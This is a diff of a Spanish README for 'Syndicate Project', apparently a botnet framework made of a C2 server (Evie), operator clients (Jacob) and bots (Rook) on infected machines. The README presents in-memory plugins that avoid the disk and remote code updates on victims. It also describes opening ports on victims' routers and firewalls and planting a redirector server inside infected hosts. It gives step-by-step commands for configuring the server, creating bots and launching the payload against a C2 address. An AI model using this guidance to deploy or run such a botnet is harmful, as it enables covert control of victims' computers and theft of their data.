@@ -8,48 +8,53 @@ Tratare de englobar todas las caracteristicas posibles de Syndicate, espero no m
 * Cifrado hibrido en las conexiones. Usando AES256 y RSA a nuestro favor podremos cifrar nuestras comunicaciones oficiales entre Evie's (**Ŝervidor**), Jacob's (**Ciente-Administrador** de los **Rook's**) y Rook's (**Cliente-bot**).
 * Cifrado simétrico en las bases de datos, tanto de **Evie**, como la de los **rook's**. Aunque en los accesos públicos también se usá el mismo esquema.
 * Red punto a punto. La red de los Rook's, no es igual a la de los Evie's, aunque puede haber comunicación entre ellas.
-* Multi-usuario. El administrador del servidor se encarga de crear tanto usuarios Jacob's cómo Rook's con sus respectivos privilegios
-* Compartir Rook's entre Evie's
-* Comunicación por servidores o lo que quiere decir, que creando una red entre Evie's puedes hacer pasar cada paquete a una dirección o podría decirse nodos intermedios hasta llegar a un punto final o nodo final. La red está diseñada para que no se pueda saber que dirección envío qué y dónde, exceptuando algunas cosas, pero que ya explicaré después y además se tiene que configurar toda la red manualmente; Eso brinda más seguridad.
+* Multi-usuario. El administrador del servidor se encarga de crear tanto usuarios Jacob's cómo Rook's con sus respectivos privilegios.
+* Compartir Rook's entre Evie's.
+* Comunicación por servidores o lo que quiere decir, que creando una red entre Evie's puede hacer pasar cada paquete a una dirección o podría decirse nodos intermedios hasta llegar a un punto final o nodo final. La red está diseñada para que no se pueda saber que dirección envío qué y dónde, exceptuando algunas cosas qué ya explicaré después y además se tiene que configurar toda la red manualmente; Eso brinda más seguridad.
 * Uso de proxy's para mayor privacidad.
 * Sistema antí-fuerza bruta. Es relativo. Relativo según las configuraciones que ejerce el administrador y el mismo usuario. porque el administrdor decide cómo **Evie**, va a bloquear a un usuario, cuándo y porqué. Dejaré la explicación más adelante.
 * Los complementos se pueden actualizar de forma transparente o lo que quiere decir, que sí tenemos una máquina infectada podremos cambiar el código desde el servidor y ejecutarlo en la máquina correspondiente.
-* Además del cifrado que viene incorporado, podemos agregarle una capa más con https
+* Además del cifrado que viene incorporado, podemos agregarle una capa más con **https**
 * Puedes crear tu propia forma de comunicarte, por lo tanto tiene dinamismo.
 * Los complementos le temen al disco duro, prefieren quedarse en memoria.
 * En el lado de los **rook's** podemos hacer que el router de la victima abra un puerto con UPnP (**Sí está disponible**)
+
+**Nota**: Los privilegios sólo son válidos para los **Jacob's**
 
 ### Tipos de configuración
 
 Existen dos tipos de configuración para que el funcionamiento de Syndicate sea satisfactorio, también sus razones de esta división:
 
 * [Configuración Dinámica](auto-config.sh): Este tipo de configuración puede cambiar en plena ejecución de [Evie](evie.py) dependiendo de lo que haga el administrador del servidor.
-* [Configuración Estática](conf/global_conf.py): También se puede llamar configuración global, porque en la mayoría de utilidades, herramientas y todo lo que tenga que ver con **Syndicate** la utiliza; además ésta no cambia en plena ejecucion.
+* [Configuración Estática](conf/global_conf.py): También se puede llamar configuración global, porque en la mayoría de utilidades, herramientas y todo lo que tenga que ver con **Syndicate** la utiliza; además esta no cambia en plena ejecucion.
 
 ### Tipos de usuario
 
 En Syndicate Project trato de implementar diferencias entre usuarios para simplificar las explicaciones; En el susodicho proyecto se puede encontrar cuatro tipos de usuario:
 
 * **Administrador del servidor**: El administrador del servidor es una pieza obligatoria para armar el tablero. Éste se encarga de crear, configurar, manejar y mucho más, de lo que tenga que ver con el funcionamiento interno de Syndicate.
-* [Jacob](jacob.py): Él es el cliente-administrador de los *rooks*. Jacob podrá controlar tantos *rook's* cómo el *Administrador del servidor* desee.
+* [Jacob](jacob.py): Él es el cliente-administrador de los **rook's**. Jacob podrá controlar tantos *rook's* cómo el *Administrador del servidor* desee.
 * [Rook](rook.py): El cliente-bot que se encarga de hacer lo que le pida **Jacob**
 * **Public**: Yo no diría que es un usuario en sí, se podría decir que es un cliente que quiere usar nuestros servicios públicos cómo:
+  
   - getPubKey: Obtener la **Clave Pública** de [Evie](evie.py); Puede tener muchos fines esta operación, pero la más importante es cuando compartirmos un rook.
   - saveData: Guarda los datos de perfil del rook
   - resend: Re-envía datos a otro nodo, tanto un nodo final como podría ser un nodo intermedio
   - sendSOS: Comunicación estilo correo electrónico entre Evie's (Incluso envío de archivos)
+  
+  **Nota**: *Los servicios públicos se pueden bloquear desde [el archivo de configuración dinámico](auto-config.sh)*
 
 ## Aclaraciones
 
 Tengo que explicar algunas cosas que iré mencionando poco a poco a lo largo de este documento:
 
 * **Redirector**: Es un **Rook** que pasa hacer un **servidor** (No un **Evie**) dentro de la máquina infectada; consiste en crear un servidor capaz de recibir datos, almacenarlos en una base de datos cifrada dentro de la misma máquina victima, para que luego el administrador del servidor, pueda conectarse, descargar los datos y simular ser **Evie**, con el único fín de obtener un resultado y enviarselo a un rook de forma transparante o como si no fuera sucedido nada.
-
-  El redirector es buena opción, cuando deseas crear un "Backup" dentro de las máquinas infectadas *¿Por qué?*, ¿Te imaginas que tu servidor central callerá? y luego cuando lo vuelvas a levantar ya es muy tardé, no tienes como recuperar la perdida de datos; hay es cuando entra redirector al rescate. **Claro que necesitas abrir un puerto en el corta fuegos de la victima. Syndicate se encarga de crear la conexión, tú te encargas de todo lo demás**.
-
+  
+  El *redirector* es buena opción, cuando deseas crear un "Backup" dentro de las máquinas infectadas *¿Por qué?*, ¿Te imaginas que tu servidor central callerá? y luego cuando lo vuelvas a levantar ya es muy tardé, no tienes como recuperar la perdida de datos; hay es cuando entra *redirector* al rescate. **Claro que necesitas abrir un puerto en el corta fuegos de la victima. Syndicate se encarga de crear la conexión, tú te encargas de todo lo demás**.
+  
 * **Hash dinámico**: En syndicate se usa un **Hash dinámico**, para hacer todo lo posble para evitar un ataque de fuerza bruta o por diccionario, usando *iteraciones*, *Número de seguridad*, *Número de disminución* y *Caracteres de seguridad*; todo esto tiene que ver con el algoritmo utilizado, pero haciendo una aclaratoria:
 
-  - **Iteraciones**: Las iteraciones son el número de veces en qu se repité el proceso.
+  - **Iteraciones**: Las iteraciones son el número de veces que se repité el proceso.
   - **Número de seguridad**: El número de seguridad se multiplica primero por el mismo y el resultado se usa para delimitar la ofuscación de caracteres de seguridad y luego en la siguiente iteración (**Si es que la hay**) disminuye usando el número de disminución.
   - **Número de disminución**: El número de disminución se encarga de disminuir el número de seguridad por cada segunda iteración.
   - **Caracteres se seguridad**: Los caracteres de seguridad se codifican a base64 y se "parten" y ofuscan usando el número de seguridad y disminución, para luego sumarlos con el resultado verdadero, que quiere decir, el hash.
@@ -60,12 +65,16 @@ Tengo que explicar algunas cosas que iré mencionando poco a poco a lo largo de 
   
 * **Clave secreta**:  La clave secreta cifra algunos datos (**Cómo la dirección URL de los nodos**) antes de usar "**resend**" o un reenvio de paquetes en una red, porque que si llega a hacer interceptada, no se pueda "leer" esos datos, por eso su nombre, ésta sólo se debe compartir con las personas de confianza, igual que pasa con el *token de acceso*.
 
+* **Clave única**: La clave única es una clave generada aleatoriamente en la creación de un nuevo **Jacob**, es importante darsela al administrador correspondiente, porque gracias a ella puede acceder.
+
+  La clave única cada vez que inicie sesión, cambiará, eso es para mantener aún más seguro la estructura.
+
 **Notas**:
 
 * Tú, como administrador del servidor te debes encargar de repartir a personas de confianza el token de acceso, claro sí es qué desean usar los servicios públicos.
-* El token de acceso se tiene que usar mayormente para usar **Compatir un rook** o usar **resend**.
+* El token de acceso se tiene que usar mayormente para **Compatir un rook** o usar **resend**.
 * En el caso de usar **resend**, tiene que usar además del token de acceso, la clave secreta.
-* Prefiero que usted use [sendSOS](sendSOS.py) y se comuniqué con el **Evie** que desee, para que tenga más seguridad en sus datos y sin limitaciones por parte de servidores externos. Aclaro ésto, porque así es la mejor manera de enviar claves secretas de forma segura. Hay otras alternativas, pero es bueno que uno mismo sea el propio servicio y no depender de otros.
+* Prefiero que usted usé [sendSOS](sendSOS.py) y se comunique con el **Evie** que desee, para que tenga más seguridad en sus datos y sin limitaciones por parte de servidores externos. Aclaro ésto, porque así es la mejor manera de enviar claves secretas de forma segura. Hay otras alternativas, pero es bueno que uno mismo sea el propio servicio y no depender de otros.
 * Tenga absoluto cuidado con los números y caracteres de seguridad, pueden volver el proceso más lento, pero eso no es tan malo, porque si un atacante quiere hacer fuerza bruta, tiene que esperar a que el servidor genere el hash y luego verificar si es correcto o no. ¿Una maravilla no? :')
 * Sí quieres saber más acerca del algoritmo, puedes hacerlo [Aquí](modules/Ciphers/db_hash.py)
 
@@ -102,17 +111,17 @@ Se guardo satisfactoriamente en -> conf/pass
 **Notas**:
 
 * Lo que acabo de introducir se genera lento en mi computadora, usted tiene que introducir lo necesario para obtener una mayor seguridad pero que el proceso no se vuelva tan lento; al fin y al cabo usted decide.
-* Sí ejecutan alguna herramienta que requiera la información para desencriptar la base de datos, se guardará en vez de comparar
+* Sí ejecutan alguna herramienta que requiera la información para desencriptar la base de datos, se guardará en vez de comparar en caso de que **conf/pass** no exista
 * **conf/pass** es guardado con permisos "**444**", por favor verifique que sea así con "ls -l conf/pass" o si no hagalo de forma manual: chmod 444 conf/pass una vez ha sido creada.
 
 ¿Ven?, sería tedíoso que tuviera que introducir todo esas cosas, mejor usamos los poderes de la linda terminal :'D:
 
 ```bash
-# Primero veamos que regla para guardar los comando en el historial tenemos
+# Primero veamos que regla estamos usando para guardar los comandos en el historial:
 echo $HISTCONTROL
 ignoreboth
 # ¡Bien!, esa es la regla perfecta.
-# Eso nos servirá cuando introduscamos un comando y no queramos que se guarde en el historial, ya que la idea es que no se registre una contraseña o algo sensible.
+# Eso nos servirá cuando para cuando introducimos un comando y no queramos que se guarde en el historial, ya que la idea es que no se registre una contraseña o algo sensible.
 # Así que ahora guardemos lo que necesitamos en una variable
  declare -x params='-db-passphrase <La frase de contraseña> -db-iterations <Iteraciones> -db-chars <Caracteres de Seguridad> -db-decrement-number <Número de disminución> -db-security-number <Número de seguridad>'
 # Cómo pueden notar, usé un espacio antes de escribir el comando, para que no se almacene en el historial.
@@ -149,10 +158,10 @@ Debe introducir "**1**" para continuar ó "**0**" para salir, aunque "**CTRL-C**
 
 * Sí no quiere que le confirmé los datos, usé "-no-confirm".
 * Cómo puede observar, hay caracteres rellenados automáticamente, puede editarlos introduciendo los parámetros correspondientes cómo: "**-i, --iterations**" para las *Iteraciones* "**-sn, --security-number**" para el "*número de seguridad*", "**-c, --security-chars**" para los *Caracteres de seguridad* y "**-d, --decrement-number**" para el *Número de disminución* o puede editarlos en el [archivo de configuración global](conf/global_conf.py).
-* Ser **root** no es lo mismo en **Linux** que en **syndicate**, **no se confunda**; significa que todos los **rook's** ahora pertenecerán a todos los **jacob's**, aunque esto es relativo, ya que si el **maximo de bot's** es mayor a "**0**" no se incluirá si llegó a su maximo.
-* Pude usar [el generador de hashes de prueba](hash_generator_test.py) para Syndicate, si desea saber cuanto puede durar la generación de su Hash y la comparación
+* Ser **root** no es lo mismo en **Linux** que en **Syndicate**, **no se confunda**; significa que todos los **rook's** ahora pertenecerán a todos los **jacob's** que son **root**, aunque esto es relativo, ya que si el **maximo de bot's** es mayor a "**0**" no se incluirá si llegó a su maximo.
+* Pude usar [el generador de hashes de prueba](hash_generator_test.py) para **Syndicate**, si desea saber cuanto puede durar la generación y la comparación de su Hash antes de salir al campo de batalla.
 
-Esperamos unos instantes y para confirmar que todo salío perfecto, ejecuté:
+Esperamos unos instantes, y para confirmar que todo salío perfecto, ejecuté:
 
 ```bash
 ./addadmin.py -show $params
@@ -165,19 +174,19 @@ Ahora pasemos a algo mejor, creemos nuestro **rook** para un **jacob**:
 ./addbot.py -u <Nombre del rook> -p <Frase de contraseña> -P <Frase de contraseña de la clave privada> -a <Administrador> $params
 ```
 
-Vemos un parámetro nuevo, "**-a**" o también podría llamarse "**--admin**". Si no razonaste correctamente, te digo que es para agregar a los **Jacob's**.
+Vemos un parámetro nuevo, "**-a**" o también podría llamarse "**--admin**". Si no razonaste correctamente, te digo que es para agregar a los **Jacob's** a el nuevo **rook**.
 
 **Notas**:
 
 * Puedes crear tantos **rook's** para **jacob's** dependiendo del **maximo de bot's**
-* El parámetro "**-a, --admin**" es de tipo **lista**, lo que quiere decir que para agregar a más de uno, tienes que usar una "**,**" (**coma**) y sí el nombre tiene espacios usa comíllas cómo apoyo.
+* El parámetro "**-a, --admin**" es de tipo **lista**, lo que quiere decir que para agregar a más de uno, tienes que usar una "**,**" (**coma**) y sí el nombre tiene espacios usa comíllas cómo apoyo. Ejemplo: **--admin "usuario, soy un usuario, otro"**
 
 Eso no es todo, necesitamos configurar [Evie](evie.py) usando [auto-config.sh](auto-config.sh) mas los parámetros ya utilizados en anteriores herramientas.
 
 ```bash
 ./auto-config.sh $params
 ```
-Usted vería cada **Clave**, **Sub-Clave** y **Valor**; los segundos que se muestran cada uno, varian dependiendo de sus recursos, esto se debe a que se está encriptado cada dato.
+Usted vería cada **Clave**, **Sub-Clave** y **Valor**; los segundos de duración por cada uno, varian dependiendo de sus recursos, esto se debe a que se está encriptado cada dato.
 
 A pesar de que se muestre la configuración al finalizar, tal vez usted quiera apreciarla para un después. Lo puede hacer así:
 
@@ -188,15 +197,17 @@ A pesar de que se muestre la configuración al finalizar, tal vez usted quiera a
 **Notas**:
 
 * Aunque [auto-config.sh](auto-config.sh) es un script, la herramienta que tiene el poder de hacer esta mágia es [evie-config.py](evie-config.py), pero es mejor automatizar todo, para ahorrar tiempo.
-* Puede obtener más información desde el mismo [Archivo de Configuración](auto-config.sh).
+* Puede obtener más información del significado de las **Claves**, **Sub-Claves** y **Valores** desde el mismo [Archivo de Configuración](auto-config.sh).
 
-Ahora si que viene lo bueno, ejecutamos [evie.py](evie.py) para iniciar el servidor:
+*Ahora si que viene lo bueno*
+
+Ejecutamos [evie.py](evie.py) para iniciar el servidor:
 
 ```bash
 ./evie.py -P <Frase de contraseña de la clave privada> $params
 ```
 
-La salida sería algo así:
+Sí ejecutamos por primera vez, verá algo así:
 
 ```
 (00:33:04 ~ 26/11/2019)[Evie:ADVERTENCIA]:---:!: El par de claves aún no son son generados ... generando ...
@@ -216,7 +227,7 @@ No explicaré todo, porque hay cosas que son sencillas y otras ya las explique, 
 
 Lo negativo de usar una ruta aleatoria es que si el servidor se "apaga" y se inicia nuevamente, tendrá otra ruta, lo que quiere decir que los **Jacob's** tendran que saberlo; es recomendable sólo cuando hay pocos **Jacob's**.
 
-Ahora para que **Evie** tenga algún sentido en la vida, que tal si ejecutamos la [Carga util](payload.py), pero antes quiero aclarar algo que tiene que ver con los complementos, aunque aún no me adentrare en aguas turbulentas por ahora estamos en la orilla del mar (**Eso es en otra sección**). Prosigamos:
+Ahora para que **Evie** tenga algún sentido en la vida, que tal si ejecutamos la [Carga útil](payload.py), pero antes quiero aclarar algo que tiene que ver con los complementos, *aunque aún no me adentraré en aguas turbulentas, por ahora estamos en la orilla del mar* (**Eso es en otra sección**). Prosigamos:
 
 Tenemos que tener en cuenta que los complementos necesitan requerimientos, cosa que mencionaré en la instalación, aunqué podemos edítar [El archivo de configuración del payload](payload_conf/modules.py) y remover o agregar lo que necesitemos.
 
@@ -231,7 +242,7 @@ Clave Privada:
 ...
 ```
 
-Usamos "**more**" para delimitar la salida y ver lo que necesitamos, la clave pública. La seleccionamos, copiamos y la guardamos en una ruta segura, cómo "**/tmp**":
+Usamos "**more**" para delimitar la salida y ver lo que necesitamos, **la clave pública**. La seleccionamos, copiamos y la guardamos en una ruta segura, cómo "**/tmp**":
 
 ```bash
 nano /tmp/<Nombre de la clave pública> # Una vez abierto "nano" pegamos la clave pública y la guardamos
@@ -243,13 +254,16 @@ Hacemos el mismo procedimiento, pero esta vez será para la **Clave Privada del 
 ```bash
  ./addbot.py -show -option keys -P <identificador del rook>:<Frase de contraseña para desencriptarla> $params
 ```
-*Cómo ven, deje un espacio para que no se guardara el comando en el historial*
+
+**Nota**: Puede asignarle permisos de escritutra y lectura dependiendo de su usuario al par de claves *para mayor seguridad*.
+
+*Cómo ve, deje un espacio para que no se guarde el comando en el historial*
 
 Esta vez vemos nuevos parámetros con argumentos interesantes:
 
 * **-show**: Mostramos los usuarios disponibles.
 * **-option**: Usamos una clave especifica para ver algo especifico de la información del usuario. Podemos usar el parámetro "**-h, --help**" para ver la ayuda dónde también nos mostrara las claves que acepta.
-* **-P**: La frase de contraseña de la clave privada.
+* **-P**: La frase de contraseña de la clave privada, siguiendo la siguiente sintaxis: \<identificador del rook>:<Frase de contraseña para desencriptarla\>
 
 Buscamos el rook y la clave privada desencriptada, hacemos el mismo procedimiento que hicimos con la clave pública de Evie
 
@@ -261,24 +275,26 @@ nano /tmp/<Nombre de la clave privada> # Una vez abierto "nano" pegamos la clave
 Ahora sí, ejecutemos el [Payload](payload.py)
 
 ```bash
-./payload.py -b <Identificador del Rook> -pass <Frase de contraseña del Rook> -a <Dirección de Evie> -p <Puerto> -P <Ruta de la dirección URL> -pub-key <Clave pública de Evie> -priv-key <Clave privada del Rook> -proto <Protocolo, puede ser http o https> -sleep-check <Intervalos en que se hace una petición para ver si hay comandos en cola> -db-path <El nombre de la base de datos> -db-pass <Frase de contraseña de la base de datos>
+./payload.py -b <Identificador del Rook> -pass <Frase de contraseña del Rook> -a <Dirección de Evie> -p <Puerto> -pub-key <Clave pública de Evie> -priv-key <Clave privada del Rook> -proto <Protocolo, puede ser http o https> -sleep-check <Intervalos en que se hace una petición para ver si hay comandos en cola> -db-path <El nombre de la base de datos> -db-pass <Frase de contraseña de la base de datos>
 ```
 
 Explico poco a poco lo que siento que pueden tener dudas:
 
 * **-sleep-check**: Rook hace una petición a el/los servidor/es para verificar si algún **Jacob** propuso un comando en cola
-* **-db-path**: Los rook's tienen bases de datos que se almacenan en el directorio temporal del sistema operativo (**encriptada**, por supuesto)
+* **-db-path**: Los rook's tienen bases de datos que se almacenan en el directorio temporal del sistema operativo (**encriptada**, por supuesto), si no especificamos un nombre se genera de forma aleatoria y si ejecutamos otra vez el *payload* tendremos otra ruta aleatoria, por éso, es mejor especificarla. 
 * **-db-pass**: La frase de contraseña para cifrar la base de datos
 
 **Nota**: Puede usar el parámetro "**-no-verbose**" para que no imprima el resultado de alguna operación
 
 *Esto es una prueba, por lo que todo se hará por la consola, ya hablare sobre como usar la programación a nuestro favor.*
 
-Ejecutamos: [control.py](control.py) para interactuar con el **Rook** de forma interactiva
+Necesitamos interactuar con el *Rook* para ello ejecutamos [control.py](control.py).
+
+Nos mostrara primero un panel de inicio de sesión, tenemos que rellenar los datos 
 
 **Nota**: Puede usar el parámetro "**-h, --help**" en la mayoria de herramientas para ver la ayuda.
 
-## Comandos
+### Comandos
 
 ## Complementos
 
@@ -351,6 +367,8 @@ Para crear un **conector** para Evie, debe tener obligatoriamente la función **
   - **debug.PER**: PERSONAL
   - **debug.COM**: COMPROMETIDO
 * Los complementos se encuentran en [complements/tools](complements/tools)
+
+## Funciones ocultas
 
 ## Plataformas
 
